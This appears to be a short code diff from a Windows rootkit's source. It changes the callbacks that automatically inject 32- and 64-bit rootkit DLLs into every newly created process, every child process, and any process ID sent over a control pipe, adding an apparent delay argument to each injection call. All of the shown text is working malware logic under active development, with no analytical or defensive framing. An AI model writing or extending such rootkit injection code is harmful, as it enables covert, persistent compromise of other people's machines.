@@ -136,8 +136,8 @@ VOID ChildProcessCallback(DWORD processId)
 
 	if (!IsInjectionPaused)
 	{
-		InjectDll(processId, RootkitDll32, RootkitDll32Size);
-		InjectDll(processId, RootkitDll64, RootkitDll64Size);
+		InjectDll(processId, RootkitDll32, RootkitDll32Size, 100);
+		InjectDll(processId, RootkitDll64, RootkitDll64Size, 100);
 	}
 }
 VOID NewProcessCallback(DWORD processId)
@@ -146,8 +146,8 @@ VOID NewProcessCallback(DWORD processId)
 
 	if (!IsInjectionPaused)
 	{
-		InjectDll(processId, RootkitDll32, RootkitDll32Size);
-		InjectDll(processId, RootkitDll64, RootkitDll64Size);
+		InjectDll(processId, RootkitDll32, RootkitDll32Size, 0);
+		InjectDll(processId, RootkitDll64, RootkitDll64Size, 0);
 	}
 }
 VOID ControlCallback(DWORD controlCode, HANDLE pipe)
@@ -193,8 +193,8 @@ VOID ControlCallback(DWORD controlCode, HANDLE pipe)
 			DWORD bytesRead;
 			if (ReadFile(pipe, &processId, sizeof(DWORD), &bytesRead, NULL) && bytesRead == sizeof(DWORD))
 			{
-				InjectDll(processId, RootkitDll32, RootkitDll32Size);
-				InjectDll(processId, RootkitDll64, RootkitDll64Size);
+				InjectDll(processId, RootkitDll32, RootkitDll32Size, 0);
+				InjectDll(processId, RootkitDll64, RootkitDll64Size, 0);
 			}
 
 			break;
